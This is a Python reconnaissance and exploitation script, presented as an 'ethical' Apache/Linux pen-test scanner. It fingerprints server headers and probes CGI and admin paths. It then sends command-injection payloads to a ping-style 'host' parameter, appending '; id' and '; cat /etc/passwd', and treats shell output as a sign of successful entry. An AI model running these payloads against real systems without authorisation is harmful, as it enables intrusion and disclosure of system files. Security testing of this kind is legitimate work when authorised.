#!/usr/bin/env python3
import requests
import argparse
import json
import sys
from urllib.parse import urljoin

def fetch_headers(target):
    """Recon: Fetch server headers for fingerprinting."""
    try:
        response = requests.head(target, timeout=5)
        headers = dict(response.headers)
        server = headers.get('Server', 'Unknown')
        findings = {
            'headers': headers,
            'is_apache': 'Apache' in server,
            'is_linux': '(Unix)' in server or 'Linux' in server,
            'version': server.split('/')[1] if 'Apache/' in server else None
        }
        if findings['is_apache'] and findings['is_linux']:
            print("[+] Confirmed: Linux Apache target")
        return findings
    except Exception as e:
        print(f"[-] Header fetch failed: {e}")
        return {}

def enumerate_paths(target):
    """Enum: Probe common paths for exposure."""
    common_paths = ['/cgi-bin/', '/admin/', '/test/', '/ping.pl']
    exposed = []
    for path in common_paths:
        url = urljoin(target, path)
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200 and 'Directory listing' in resp.text:
                exposed.append(url)
                print(f"[+] Exposed path: {url}")
            elif 'ping' in resp.text.lower():  # Hint for CGI ping script
                exposed.append(url)
                print(f"[+] Potential CGI endpoint: {url}")
        except:
            pass
    return exposed

def test_injection(target, endpoint):
    """Exploit Test: Simulate command injection for entry."""
    payloads = [
        {'host': '127.0.0.1; id'},  # Basic injection
        {'host': '127.0.0.1; cat /etc/passwd'}  # Info disclosure
    ]
    entry_success = False
    for payload in payloads:
        try:
            resp = requests.get(endpoint, params=payload, timeout=10)
            if 'uid=' in resp.text or 'root:' in resp.text:  # Signs of shell execution/entry
                print(f"[!] Injection success - Potential entry via: {payload}")
                entry_success = True
                break
        except:
            pass
    return entry_success

def main():
    parser = argparse.ArgumentParser(description="Ethical Apache Linux Pen Test Scanner")
    parser.add_argument('--target', required=True, help="Target URL (e.g., http://192.168.1.100)")
    args = parser.parse_args()

    report = {
        'target': args.target,
        'timestamp': '2025-10-09',
        'findings': {}
    }

    print(f"[*] Scanning {args.target}...")
    report['findings']['headers'] = fetch_headers(args.target)
    exposed = enumerate_paths(args.target)
    report['findings']['exposed_paths'] = exposed

    if exposed:
        # Test first exposed CGI-like endpoint
        test_endpoint = exposed[0] if exposed[0].endswith('/') else exposed[0] + '?host=127.0.0.1'
        report['findings']['injection_test'] = test_injection(args.target, test_endpoint)
        if report['findings']['injection_test']:
            print("[!] Entry point identified - Recommend patching CGI input validation")

    # Log report
    with open('scan_report.json', 'w') as f:
        json.dump(report, f, indent=4)
    print("[+] Report saved to scan_report.json")

if __name__ == "__main__":
    main()
